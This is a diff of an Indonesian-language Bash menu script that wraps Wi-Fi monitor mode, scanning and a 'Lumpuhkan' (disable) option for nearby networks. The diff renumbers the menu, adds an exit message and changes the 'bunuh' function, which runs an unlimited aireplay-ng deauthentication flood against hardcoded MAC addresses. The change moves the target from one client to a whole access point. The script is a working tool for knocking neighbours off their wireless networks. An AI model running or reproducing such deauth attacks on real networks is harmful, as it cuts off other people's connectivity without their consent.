@@ -29,9 +29,8 @@ main(){
 	echo -e "$white========================== $Cafe";
 	echo -e "1. Hidupkan Monitor";  
 	echo -e "2. Matikan Monitor";  
-	echo -e "3. Status Monitor"; 
-	echo -e "4. Scan Sekitar";
-	echo -e "5. Lumpuhkan <samping>";
+	echo -e "3. Scan Sekitar";
+	echo -e "4. Lumpuhkan <samping>";
 	echo -e "0. Keluar $white"; 
 	echo "==========================";
 	read  -p "Pilih  : " a
@@ -42,15 +41,15 @@ main(){
 		mati;
 		main;
 	elif [[ $a == 3 ]]; then
-		status;
-		main;
-
-	elif [[ $a == 4 ]]; then
 		# sudo airodump-ng mon0;
 		pilihScan;
-	elif [[ $a == 5 ]]; then
+	elif [[ $a == 4 ]]; then
 		bunuh;
 	elif [[ $a == 0 ]]; then
+		clear
+		echo ""
+		echo " [ Sampai Jumpa! ]"
+		echo ""
 		exit 1
 	else
 		
@@ -60,7 +59,7 @@ main(){
 }
 
 bunuh(){
-	sudo aireplay-ng --deauth 0 -a 98:DE:D0:BD:0F:E0 -c 50:64:2B:25:F8:AB --ignore-negative-one mon0
+	sudo aireplay-ng --deauth 0 -a 50:64:2B:25:F8:AB --ignore-negative-one mon0
 	
 	
 }
